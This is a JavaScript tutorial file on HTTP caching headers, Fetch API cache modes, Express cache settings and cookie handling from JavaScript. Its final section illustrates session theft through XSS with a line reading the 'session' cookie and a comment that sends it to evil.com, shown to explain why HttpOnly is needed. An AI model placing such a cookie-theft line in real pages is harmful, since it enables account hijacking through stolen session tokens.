// ── Inspecting cache headers in the browser ──────────────────
async function fetchWithCacheInfo(url) {
  const res = await fetch(url);

  // These headers reveal the caching state of the response
  const cacheControl = res.headers.get('cache-control');
  const etag         = res.headers.get('etag');
  const lastModified = res.headers.get('last-modified');
  // 'Age' = seconds since this response was generated (by CDN or origin)
  const age          = res.headers.get('age');
  // 'X-Cache' is a non-standard CDN header: HIT or MISS
  const xCache       = res.headers.get('x-cache');

  console.log({ cacheControl, etag, lastModified, age, xCache });
  return res.json();
}

// ── Fetch API cache modes — fine-grained browser cache control ─
async function fetchExamples(url) {
  // 'default': browser decides based on Cache-Control headers
  const a = await fetch(url, { cache: 'default' });

  // 'no-store': bypass cache entirely — do not read from or write to cache
  const b = await fetch(url, { cache: 'no-store' });

  // 'no-cache': always revalidate (conditional GET), same as Cache-Control: no-cache
  const c = await fetch(url, { cache: 'no-cache' });

  // 'force-cache': serve from cache even if stale — only hit network if no cache entry
  const d = await fetch(url, { cache: 'force-cache' });

  // 'reload': bypass cache for reading, but store the fresh response in cache
  const e = await fetch(url, { cache: 'reload' });

  // 'only-if-cached': serve from cache only; error if not cached
  // (only works in same-origin requests)
  const f = await fetch(url, { cache: 'only-if-cached' });

  return { a, b, c, d, e, f };
}

// ── Server-side cache headers (Node.js / Express example) ─────
function setCacheHeaders(res, type) {
  switch (type) {
    case 'html':
      // Always revalidate — users must get latest HTML pointing to newest hashed assets
      res.setHeader('Cache-Control', 'no-cache');
      break;
    case 'hashed-asset':
      // Content hash in filename means URL changes on every deploy — safe to cache forever
      res.setHeader('Cache-Control', 'max-age=31536000, immutable');
      break;
    case 'api-public':
      // CDN can cache for 5 min, browser for 60s
      res.setHeader('Cache-Control', 'public, max-age=60, s-maxage=300');
      break;
    case 'api-private':
      // User-specific data: browser only, no CDN
      res.setHeader('Cache-Control', 'private, max-age=60');
      break;
    case 'sensitive':
      // Never cache — financial transactions, health data
      res.setHeader('Cache-Control', 'no-store');
      break;
  }
}

console.log('Cache header examples ready');

// ── Reading and writing cookies from JavaScript ───────────────
// Note: HttpOnly cookies are INVISIBLE to all of this code.
// Only cookies without HttpOnly can be read/written via JS.

function setCookie(name, value, options = {}) {
  const {
    maxAge   = 3600,      // 1 hour default
    path     = '/',
    domain   = '',        // empty = current domain only
    secure   = true,      // always use Secure in production
    sameSite = 'Lax',     // 'Strict' | 'Lax' | 'None'
  } = options;

  const parts = [
    `${encodeURIComponent(name)}=${encodeURIComponent(value)}`,
    `Max-Age=${maxAge}`,
    `Path=${path}`,
  ];

  if (domain) parts.push(`Domain=${domain}`);
  if (secure)  parts.push('Secure');
  parts.push(`SameSite=${sameSite}`);

  // 'HttpOnly' intentionally CANNOT be set from JavaScript.
  // Only a server's Set-Cookie header can set HttpOnly cookies.
  document.cookie = parts.filter(Boolean).join('; ');
}

function getCookie(name) {
  const key = encodeURIComponent(name) + '=';
  const pair = document.cookie
    .split('; ')
    .find(row => row.startsWith(key));
  return pair ? decodeURIComponent(pair.slice(key.length)) : null;
}

function deleteCookie(name, path = '/') {
  // Setting Max-Age=0 tells the browser to delete immediately
  document.cookie =
    `${encodeURIComponent(name)}=; Max-Age=0; Path=${path}`;
}

// ── Usage ─────────────────────────────────────────────────────
setCookie('theme', 'dark', { maxAge: 86400 * 365 }); // 1-year preference cookie
console.log(getCookie('theme'));                      // 'dark'
deleteCookie('theme');
console.log(getCookie('theme'));                      // null

// ── Why you cannot protect session tokens with JS cookies ─────
// An attacker-injected XSS payload can do:
const stolenToken = getCookie('session'); // works if HttpOnly is missing!
// Then exfiltrate: new Image().src = `https://evil.com/?c=${stolenToken}`
// This is why session cookies must ALWAYS be set by the server with HttpOnly.

